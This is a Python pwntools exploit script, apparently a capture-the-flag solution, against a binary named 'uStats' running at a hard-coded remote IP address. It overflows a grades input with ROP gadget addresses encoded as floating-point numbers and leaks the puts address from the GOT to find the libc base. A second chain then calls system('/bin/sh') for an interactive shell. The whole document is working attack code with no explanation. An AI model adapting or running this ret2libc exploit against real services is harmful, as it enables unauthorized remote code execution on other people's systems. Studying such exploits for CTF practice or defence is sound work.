from pwn import *
import struct

elf = ELF("./uStats",checksec=False)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)

# context.log_level = 'debug'

### Gadget
pop_rdi = 0x00000000004015b3
ret = 0x000000000040101a

### func
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
libc_puts = libc.symbols["puts"]
add_grades = 0x4013b5

def htd(num):
    # print(num)
    addr = p64(num).hex()
    out = struct.unpack('d', bytes.fromhex(addr))[0]
    return str(out).encode()

def pad():
    for i in range(39):
        r.sendlineafter(b": ",b".")

# r = process(['./ustats'])
r = remote("103.37.125.56",10003)

r.sendlineafter(b"masukkan? ",b"43")

pad()

# gdb.attach(r)

r.sendlineafter(b": ",htd(pop_rdi))
r.sendlineafter(b": ",htd(puts_got))
r.sendlineafter(b": ",htd(puts_plt))
r.sendlineafter(b": ",htd(add_grades))

r.recvline()
r.recvline()
r.recvline()

# r.interactive()

leak = u64(r.recvuntil(b'\n',drop=True).ljust(8, b"\x00"))

log.info("Leaked libc address,  puts: "+ hex(leak))

libc.address = leak - libc_puts
libc_system = libc.symbols["system"]
bin_sh = next(libc.search(b"/bin/sh\x00"))

log.info("Leaked libc address,  base: "+ hex(libc.address))
log.info("Leaked libc address,  system: "+ hex(libc_system))
log.info("Leaked libc address,  binsh: "+ hex(bin_sh))

r.sendlineafter(b"masukkan? ",b"43")

pad()

r.sendline(htd(ret))
r.sendline(htd(pop_rdi))
r.sendline(htd(bin_sh))
r.sendline(htd(libc_system))

r.interactive()
